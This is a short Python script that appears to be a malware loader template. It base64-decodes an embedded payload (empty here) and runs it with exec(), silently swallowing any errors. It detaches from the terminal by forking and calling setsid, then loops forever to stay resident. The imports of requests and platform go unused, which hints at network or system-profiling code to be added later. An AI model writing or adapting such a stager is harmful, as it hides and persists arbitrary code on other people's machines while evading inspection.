import os, sys, time, platform, base64, threading, requests

ENCODED_DATA = b''

def run():
    try:
        decoded_code = base64.b64decode(ENCODED_DATA).decode('utf-8')
        exec(decoded_code, globals())
    except Exception as e:
        pass

if __name__ == "__main__":
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
        os.setsid()
    except:
        pass
    run()
    while True:
        time.sleep(100)
